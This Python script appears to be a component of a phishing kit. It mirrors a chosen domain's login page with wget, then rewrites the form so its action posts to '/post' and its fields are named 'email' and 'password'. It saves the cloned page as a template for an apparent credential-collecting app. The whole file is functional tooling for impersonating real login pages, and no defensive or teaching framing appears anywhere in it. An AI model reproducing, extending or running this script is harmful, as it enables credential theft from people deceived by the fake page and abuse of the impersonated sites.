import shutil
import subprocess
from pathlib import Path
import time
from bs4 import BeautifulSoup

DOMAIN = "" # The domain you want to process
PATH = "login" # The path_segment of the possible login page. Example: login, admin, auth/login

def installed(*programs): # check if tools are installed (*multiple tools possible)
    return [program for program in programs if shutil.which(program)]

def sc(domain: str, path:str):
    url = f"https://{domain}/{path}" # build url using protocol + domain and path

    if "wget" not in installed("wget"):
        print("wget is not installed.")
        return False # if return function stops

    try:
        subprocess.run( # use subprocess to execute a command-line-tool
            [
                "wget",                 # Download files from a URL
                "--page-requisites",    # Download all files required to display the page correctly
                "--convert-links",      # Convert downloaded links so they work locally
                "--adjust-extension",   # Add the appropriate file extension to downloaded files
                url
            ],
            check=True,
            text=True,
            capture_output=True
        )

        print("wget succeeded for:", domain)

    except subprocess.CalledProcessError as e:
        print("wget failed for:", domain, e)
        return False

    time.sleep(2)

    login_dir = Path(__name__).parent
    login_page = login_dir/domain/f"{PATH}.html" # downloaded page. PATH is ussaly the filename

    if login_page.exists():

        with open(login_page, "r", encoding="utf-8") as f: # stores the value of login_page in f
            soup = BeautifulSoup(f, "html.parser") # bs4 object

        form = soup.find("form") # find form (the section where inputs are)
        form["action"] = "/post" # write action="/post" for app.py

        inputs = form.find_all("input")

        inputs[0]["name"] = "email" # change first input name to email for app.py
        inputs[1]["name"] = "password" # change second input name to passwort for app.py

        with open("templates/index.html", "w", encoding="utf-8") as f:
            f.write(str(soup)) # store new template template/index.html

sc(DOMAIN, PATH)


